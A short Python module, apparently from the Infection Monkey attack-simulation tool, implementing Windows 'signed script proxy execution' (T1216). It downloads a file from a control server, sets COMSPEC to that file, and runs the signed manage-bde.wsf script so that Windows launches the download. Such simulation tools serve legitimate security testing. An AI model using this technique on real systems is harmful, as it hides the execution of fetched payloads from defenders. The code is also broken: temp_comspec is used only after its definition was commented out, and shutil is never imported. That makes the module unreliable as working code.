import subprocess
from pathlib import Path

from infection_monkey.control import ControlClient


def get_windows_commands_to_proxy_execution_using_signed_script():
    # temp_comspec_path = ['infection_monkey', 'post_breach', 'signed_script_proxy', 'windows', 'random_executable.exe']
    # temp_comspec = Path(*temp_comspec_path)
    with ControlClient.get_T1216_pba_file() as r:
        with open(temp_comspec, 'wb') as f:
            shutil.copyfileobj(r.raw, f)

    windir_path = subprocess.check_output('echo %WINDIR%', shell=True).decode().strip('\r\n')  # noqa: DUO116
    signed_script_path = [windir_path, 'System32', 'manage-bde.wsf']
    signed_script = Path(*signed_script_path)

    return [
        f'set comspec={temp_comspec} &&',
        f'cscript {signed_script}'
    ]


def get_windows_commands_to_reset_comspec(original_comspec):
    return f'set comspec={original_comspec}'
